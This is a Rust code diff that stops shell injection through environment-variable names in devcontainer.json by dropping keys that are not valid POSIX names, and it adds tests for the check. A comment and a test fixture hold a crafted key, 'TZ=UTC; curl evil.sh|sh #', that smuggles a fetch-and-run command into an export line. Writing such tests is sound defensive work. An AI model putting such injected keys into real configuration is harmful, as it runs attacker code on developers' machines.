@@ -361,9 +361,27 @@ fn fold_ports(dc: &DevContainer, sb: &mut SandboxConfig) {
 fn fold_env(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) {
     let mut exports = String::new();
     for (k, v) in dc.container_env.iter().chain(dc.remote_env.iter()) {
+        // The value is sh_quote'd, but the KEY is pasted verbatim into
+        // `export {k}=…`. A repo-committed devcontainer.json is attacker-
+        // controlled, and env applies UNGATED (literal values), so a crafted
+        // key like `TZ=UTC; curl evil|sh #` would inject shell. Only accept
+        // POSIX env-name keys; drop + warn on anything else so the gate can't
+        // be bypassed through the env channel.
+        if !is_valid_env_name(k) {
+            tracing::warn!(key = %k, "devcontainer: dropping env with non-identifier name");
+            continue;
+        }
         exports.push_str(&format!("export {}={}\n", k, sh_quote(&ctx_subst(v, ctx))));
     }
     prepend_init(sb, exports);
+}
+
+/// True when `k` is a POSIX-portable environment-variable name
+/// (`[A-Za-z_][A-Za-z0-9_]*`) — the only shape safe to paste after `export `.
+fn is_valid_env_name(k: &str) -> bool {
+    let mut chars = k.chars();
+    matches!(chars.next(), Some(c) if c == '_' || c.is_ascii_alphabetic())
+        && chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
 }
 
 /// `postStart` + `postAttach` → `init_script` (per-pane). A multiplexer has no
@@ -823,6 +841,42 @@ mod tests {
         apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
         assert!(sb.init_script.contains("export TZ=UTC"));
         assert!(sb.image.is_empty());
+    }
+
+    #[test]
+    fn malicious_env_key_is_dropped_not_injected() {
+        // A repo-committed env key crafted to break out of `export {k}=…` must
+        // NOT reach init_script — env applies ungated, so this is the exact
+        // shell-injection that would bypass the lifecycle trust gate.
+        let dc = parse(
+            r#"{ "image": "x", "containerEnv": {
+                "TZ=UTC; curl evil.sh|sh #": "x",
+                "SAFE": "ok",
+                "bad key": "y",
+                "1LEADINGDIGIT": "z"
+            } }"#,
+        )
+        .unwrap();
+        let mut sb = SandboxConfig::default();
+        apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
+        // The only valid identifier lands; the injection + malformed names don't.
+        assert!(sb.init_script.contains("export SAFE=ok"));
+        assert!(!sb.init_script.contains("curl evil.sh"));
+        assert!(!sb.init_script.contains("bad key"));
+        assert!(!sb.init_script.contains("1LEADINGDIGIT"));
+    }
+
+    #[test]
+    fn env_name_validation() {
+        assert!(is_valid_env_name("PATH"));
+        assert!(is_valid_env_name("_x9"));
+        assert!(is_valid_env_name("A_B_C"));
+        assert!(!is_valid_env_name(""));
+        assert!(!is_valid_env_name("9x"));
+        assert!(!is_valid_env_name("a b"));
+        assert!(!is_valid_env_name("a=b"));
+        assert!(!is_valid_env_name("a;b"));
+        assert!(!is_valid_env_name("café"));
     }
 
     #[test]
